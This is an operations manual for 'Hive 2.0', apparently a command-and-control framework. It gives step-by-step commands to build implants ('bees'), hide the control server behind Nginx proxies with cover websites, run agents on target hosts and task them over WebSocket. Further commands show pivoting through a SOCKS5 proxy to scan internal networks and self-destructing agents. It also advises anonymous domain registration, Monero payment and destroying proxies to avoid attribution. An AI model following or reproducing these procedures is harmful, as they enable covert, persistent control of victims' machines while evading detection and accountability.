# Hive 2.0 — Operations Manual

**Version:** 1.1
**Audience:** Red Team Operators, System Administrators
**Last Updated:** 2026-05-14

---

## Table of Contents

1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Environment Preparation](#environment-preparation)
   - 3.1 [Installing Go](#installing-go)
   - 3.2 [Cloning the Repository](#cloning-the-repository)
   - 3.3 [Building from Source](#building-from-source)
   - 3.4 [Building the Web Dashboard](#building-the-web-dashboard)
4. [Configuration Management](#configuration-management)
   - 4.1 [Generating Encryption Keys](#generating-encryption-keys)
   - 4.2 [Creating Plaintext Configs](#creating-plaintext-configs)
   - 4.3 [Encrypting Configs](#encrypting-configs)
5. [Fronting Proxy Deployment](#fronting-proxy-deployment)
   - 5.1 [Provisioning a VPS](#provisioning-a-vps)
   - 5.2 [Automated Setup with Ansible](#automated-setup-with-ansible)
   - 5.3 [Manual Nginx Configuration](#manual-nginx-configuration)
   - 5.4 [Verifying the Proxy](#verifying-the-proxy)
   - 5.5 [Rotating Certificates](#rotating-certificates)
   - 5.6 [Destroying a Proxy](#destroying-a-proxy)
6. [Running the Hive Server](#running-the-hive-server)
   - 6.1 [Starting the Server](#starting-the-server)
   - 6.2 [Configuring TLS Certificates](#configuring-tls-certificates)
   - 6.3 [Accessing the Dashboard](#accessing-the-dashboard)
   - 6.4 [Server Logging](#server-logging)
7. [Running an Agent](#running-an-agent)
   - 7.1 [Direct Connection (Testing)](#direct-connection-testing)
   - 7.2 [Production Connection via Proxy](#production-connection-via-proxy)
   - 7.3 [Agent Reconnection Behaviour](#agent-reconnection-behaviour)
   - 7.4 [Cross‑Compilation for Windows](#cross-compilation-for-windows)
8. [Operational Tasks](#operational-tasks)
   - 8.1 [Listing Agents](#listing-agents)
   - 8.2 [Sending Commands](#sending-commands)
   - 8.3 [Viewing Results](#viewing-results)
   - 8.4 [Enabling the SOCKS5 Proxy](#enabling-the-socks5-proxy)
   - 8.5 [Agent Self‑Destruct](#agent-self-destruct)
   - 8.6 [Generating an Operation Report](#generating-an-operation-report)
9. [Security Procedures](#security-procedures)
   - 9.1 [Key Hygiene](#key-hygiene)
   - 9.2 [Proxy Anonymisation](#proxy-anonymisation)
   - 9.3 [Incident Response](#incident-response)
10. [Troubleshooting](#troubleshooting)
    - 10.1 [Agent Cannot Connect](#agent-cannot-connect)
    - 10.2 [WebSocket Upgrade Failure](#websocket-upgrade-failure)
    - 10.3 [Command Execution Timeout](#command-execution-timeout)
    - 10.4 [SOCKS5 Proxy Not Working](#socks5-proxy-not-working)
11. [Appendix: Example Session](#appendix-example-session)
12. [Glossary](#glossary)

---

## 1. Introduction

This manual describes the complete lifecycle of a Hive 2.0 operation: from building the binaries, through deploying fronting proxies, to commanding agents and retrieving results. Every step is designed to be repeatable and auditable. Follow the procedures in order the first time you set up a new swarm.

---

## 2. Prerequisites

- **Go 1.22** or later (for building from source).
- **Node.js 18** and **npm** (to build the web dashboard).
- **GNU Make** (optional, simplifies build).
- **Ansible 2.14+** (for automated proxy deployment).
- **SSH access** to the target VPS instances.
- **OpenSSL** (for certificate and key generation).
- A **domain name** (or subdomain) for each fronting proxy.
- Basic familiarity with the Linux command line.

---

## 3. Environment Preparation

### 3.1 Installing Go

Download and install Go 1.22 from [go.dev/dl](https://go.dev/dl). After installation, verify:

```bash
go version
# Expected: go version go1.22.x linux/amd64

3.2 Cloning the Repository
bash

git clone https://github.com/blackswarm/hive.git
cd hive

3.3 Building from Source

The project includes a React dashboard that must be built first. Ensure you have Node.js 18+ and npm installed.
3.3.1 Build the web interface and then the binaries
bash

make build

This runs build-web (installs npm dependencies and builds the React app into web/build), then compiles both hive-server and hive-agent.

If you prefer manual steps:
bash

cd web
npm install
npm run build
cd ..
go build -o bin/hive-server ./cmd/hive
go build -o bin/hive-agent ./cmd/hive

To build only the agent or server:
bash

make build-agent
make build-server

For Windows agent:
bash

make build-agent-win

3.4 Building the Web Dashboard

The dashboard source is in web/. The build output goes to web/build/, which is embedded into the Go binary via //go:embed. The make build command automatically handles this step. If you ever modify the dashboard, rerun npm run build inside the web directory.
4. Configuration Management

All configuration files are JSON documents encrypted with AES‑256‑GCM. A 32‑byte key is required to encrypt or decrypt them.
4.1 Generating Encryption Keys

Generate a secure random key:
bash

export HIVE_CONFIG_KEY=$(openssl rand -base64 32)

Output example: 3Zg8...= (44 characters, 32 bytes when decoded).

Set this key in your shell environment:
bash

export HIVE_CONFIG_KEY="your-base64-encoded-32-byte-key"

Keep this key secret. Without it, configurations cannot be read.
4.2 Creating Plaintext Configs

Create two plain JSON files based on the provided templates.

Agent configuration (agent.json):
json

{
  "mode": "agent",
  "server_port": 8443,
  "proxies": [
    "proxy1.yourdomain.com",
    "proxy2.yourdomain.com"
  ],
  "agent_id": "bee-01",
  "secret_key": "placeholder-will-be-replaced"
}

    proxies: ordered list of fronting proxy domains. The agent will try them in sequence.

    agent_id: unique identifier for this agent (e.g., bee-01, bee-02).

    secret_key: temporary placeholder; the encryption step will replace it with a generated key.

Server configuration (server.json):
json

{
  "mode": "server",
  "server_port": 8443,
  "proxies": [],
  "agent_id": "",
  "secret_key": "placeholder-will-be-replaced"
}

The server configuration does not require a proxy list; it receives connections via the proxies.
4.3 Encrypting Configs

Use the built-in encryption command. The key must be in the HIVE_CONFIG_KEY environment variable.
bash

export HIVE_CONFIG_KEY="your-base64-key"

# Encrypt agent config
./bin/hive-server -encrypt-in agent.json -encrypt-out agent_config.json

# Encrypt server config
./bin/hive-server -encrypt-in server.json -encrypt-out server_config.json

The encrypted files (agent_config.json, server_config.json) are binary and can be used with the -config flag. The original plaintext files should be securely deleted.
5. Fronting Proxy Deployment

Each fronting proxy is an Nginx server that serves a static cover website and proxies WebSocket connections to the backend hive.
5.1 Provisioning a VPS

    Choose a cheap VPS provider (e.g., Hetzner, Contabo, Vultr).

    Install a minimal Debian 12.

    Ensure you have SSH root access and the public IP.

    Register a domain name (or subdomain) pointing to this IP.

5.2 Automated Setup with Ansible

The repository includes scripts/deploy_proxy.yml.

    Install Ansible on your local machine.

    Create an inventory file (e.g., hosts.ini):
    text

[proxy]
proxy1.example.com ansible_user=root

Run the playbook:
bash

ansible-playbook -i hosts.ini scripts/deploy_proxy.yml

    The playbook will:

        Install Nginx.

        Generate a self‑signed certificate.

        Create a minimal cover website.

        Configure the Nginx proxy.

        Restart Nginx.

5.3 Manual Nginx Configuration

If you prefer manual setup:

    Install Nginx: apt update && apt install -y nginx openssl

    Create /etc/nginx/certs and generate a certificate:
    bash

openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/nginx/certs/proxy.key \
    -out /etc/nginx/certs/proxy.crt \
    -subj "/CN=proxy1.example.com"

Place the cover website in /var/www/hive-cover/index.html:
html

<!DOCTYPE html><html><head><title>Under Maintenance</title></head>
<body><h1>We'll be back soon.</h1></body></html>

Copy the Nginx configuration from configs/proxy_nginx.conf into /etc/nginx/sites-available/hive-proxy.

Enable the site:
bash

ln -s /etc/nginx/sites-available/hive-proxy /etc/nginx/sites-enabled/
rm /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx

5.4 Verifying the Proxy

    Open a browser and navigate to https://proxy1.example.com. You should see the maintenance page.

    Check the WebSocket endpoint using curl:
    bash

curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
     -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
     https://proxy1.example.com/ws

    You should receive an HTTP 101 Switching Protocols response.

5.5 Rotating Certificates

To replace the self‑signed certificate without downtime, use the rotate_certs.sh script:
bash

./scripts/rotate_certs.sh proxy1.example.com

The script backs up the old certificate, generates a new one, and restarts Nginx.
5.6 Destroying a Proxy

To completely remove a proxy and its traces:
bash

./scripts/destroy_proxy.sh

This will purge Nginx, delete configuration files, and remove the cover website.
6. Running the Hive Server
6.1 Starting the Server

Place the encrypted server config (e.g., server_config.json) in a known location.
bash

export HIVE_CONFIG_KEY="your-base64-encoded-key"
./bin/hive-server -mode=server -config=./server_config.json

If the TLS certificate and key (server.crt, server.key) are present in the working directory, the server will use TLS 1.3. Otherwise, it falls back to plain HTTP (not recommended).
6.2 Configuring TLS Certificates

For production, obtain a certificate (Let’s Encrypt or self‑signed) and rename the files to server.crt and server.key. The server auto‑detects them at startup.

Generate a self‑signed certificate:
bash

openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout server.key -out server.crt \
    -subj "/CN=hive.internal"

6.3 Accessing the Dashboard

Open a browser and go to https://<hive-address>:8443. The embedded React dashboard loads automatically. It displays a list of online agents and allows you to send commands. The dashboard communicates with the server via REST endpoints:

    GET /api/agents — list of connected agents

    POST /api/tasks — send a command to an agent

The interface shows the agent inventory, an input for commands, and a result list. As agents come online, they appear in the list automatically (polled every 5 seconds). You can type a command, click "Send" next to an agent, and the result will appear in the results area.
6.4 Server Logging

The server logs JSON‑structured logs to stdout. You can redirect them to a file:
bash

./bin/hive-server ... 2>&1 | tee server.log

7. Running an Agent
7.1 Direct Connection (Testing)

For testing without a proxy, set the server URL directly:
bash

./bin/hive-agent -mode=agent -config=./agent_config.json

But the agent expects the proxy list; you can temporarily set the first proxy to the server address and ensure the server is listening on the same port.
7.2 Production Connection via Proxy

Ensure the agent configuration includes at least one proxy domain:
json

"proxies": ["proxy1.example.com"]

Start the agent:
bash

export HIVE_CONFIG_KEY="..."
./bin/hive-agent -mode=agent -config=./agent_config.json

The agent will connect to wss://proxy1.example.com/ws, which is forwarded by Nginx to the hive.
7.3 Agent Reconnection Behaviour

    If the connection drops, the agent waits 2 seconds before retrying, then 4, 8, … up to 60 seconds.

    It continues indefinitely until it connects or is terminated.

7.4 Cross‑Compilation for Windows

On a Linux system:
bash

make build-agent-win

Transfer bin/hive-agent.exe to the target Windows machine. You can run it as:
cmd

set HIVE_CONFIG_KEY=...
hive-agent.exe -mode=agent -config=agent_config.json

The Windows agent has the same functionality, including self‑destruct (delayed deletion on reboot) and command execution (using cmd /c).
8. Operational Tasks
8.1 Listing Agents

Via the dashboard: the list of agents appears automatically. You can also query the REST API directly:
bash

curl https://<hive-address>/api/agents

Response is a JSON array of agent objects with fields id, hostname, os, ip, last_seen, status.
8.2 Sending Commands

Via dashboard: type a command in the input field, then click "Send" next to the desired agent. The result will appear in the results list when it arrives.

Via API:
bash

curl -X POST https://<hive-address>/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"bee-01","command":"whoami"}'

The server returns a JSON object {"task_id":"..."}. You can use this ID to correlate with results.
8.3 Viewing Results

Results are shown in the dashboard and also logged by the server. They are not persisted; once an agent disconnects, old results are lost (future improvement).
8.4 Enabling the SOCKS5 Proxy

Send a proxy_on message to the agent over the WebSocket (not yet exposed via dashboard). You can use a tool like websocat:
bash

echo '{"type":"proxy_on"}' | websocat wss://<proxy>/ws

The agent will start a SOCKS5 proxy on port 1080. You can then configure your tools to use socks5://<agent-ip>:1080.

To stop the proxy, send {"type":"proxy_off"}.
8.5 Agent Self‑Destruct

Send a destroy message (via WebSocket). The agent will:

    On Linux: delete its own binary and exit.

    On Windows: schedule deletion on next reboot and exit.

Example:
bash

echo '{"type":"destroy"}' | websocat wss://<proxy>/ws

8.6 Generating an Operation Report

The reporting.go module can produce a Markdown report. This is not yet wired into the server API, but you can call GenerateReport from a custom script or command‑line tool. The function takes an AgentManager, a list of tasks, and a list of results, and returns a Markdown string. You can pipe it to a .md file and convert to PDF with pandoc.
9. Security Procedures
9.1 Key Hygiene

    Never store the HIVE_CONFIG_KEY in version control.

    Use different keys for different environments (testing vs. production).

    Rotate keys between operations if a compromise is suspected.

9.2 Proxy Anonymisation

    Register domains with anonymous details (e.g., Njalla).

    Pay for VPS with cryptocurrency (Monero preferred).

    Do not reuse proxy IPs across operations; destroy them after the engagement.

9.3 Incident Response

If a proxy is taken down or the hive is compromised:

    Send a destroy message to all agents (if possible).

    Shred configuration files on the hive.

    Run destroy_proxy.sh on each proxy.

    Rotate all keys and domain registrations.

10. Troubleshooting
10.1 Agent Cannot Connect

    Check that the proxy domain resolves to the correct IP.

    Verify that Nginx is running and the /ws location is correctly configured.

    Look at agent logs for TLS or WebSocket handshake errors.

    Ensure the agent’s proxies list contains the correct domain.

10.2 WebSocket Upgrade Failure

    Confirm that proxy_http_version 1.1 and the Upgrade and Connection headers are set in the Nginx config.

    Check the backend hive server is reachable from the proxy.

10.3 Command Execution Timeout

    Increase the timeout field in TaskMsg or set a higher default in the agent’s config.

    Ensure the command does not require interactive input; all commands run non‑interactively.

10.4 SOCKS5 Proxy Not Working

    Verify the agent received proxy_on and the logs show “SOCKS5 proxy started”.

    Check network connectivity between your pivot machine and the agent’s IP.

    Ensure no firewall blocks port 1080.

11. Appendix: Example Session

Setup:

    Proxy: proxy1.ops.net

    Hive: internal IP 10.0.0.5

    Agent: bee-01 on a target Windows host

1. Generate key and encrypt configs:
bash

export HIVE_CONFIG_KEY=$(openssl rand -base64 32)
./bin/hive-server -encrypt-in agent.json -encrypt-out agent_config.json
./bin/hive-server -encrypt-in server.json -encrypt-out server_config.json

2. Start the hive server:
bash

./bin/hive-server -mode=server -config=server_config.json

3. Start the agent on target (via proxy):
cmd

set HIVE_CONFIG_KEY=...
hive-agent.exe -mode=agent -config=agent_config.json

4. Agent registers; hive log shows:
text

INFO agent registered id=bee-01 hostname=WIN-TARGET

5. Send a task via dashboard or curl:
bash

curl -X POST https://proxy1.ops.net/api/tasks \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"bee-01","command":"ipconfig"}'

6. Result appears in dashboard and server log.

7. Enable SOCKS5 proxy (using websocat):
bash

echo '{"type":"proxy_on"}' | websocat wss://proxy1.ops.net/ws

8. Pivot through agent:
bash

proxychains nmap -sT -Pn 10.0.0.0/24

9. Generate report: call GenerateReport and save to report.md.

10. Clean up: send destroy to the agent. Then destroy the proxy VPS.
12. Glossary
Term	Meaning
Hive	Command centre server managing one or more agents.
Agent (Bee)	Implant running on the target.
Fronting Proxy	Nginx server that hides the hive behind a benign website.
WebSocket	Full‑duplex protocol used for C2 communication.
SOCKS5	Proxy protocol allowing TCP/UDP tunnelling.
AES‑256‑GCM	Encryption algorithm used for configuration files.
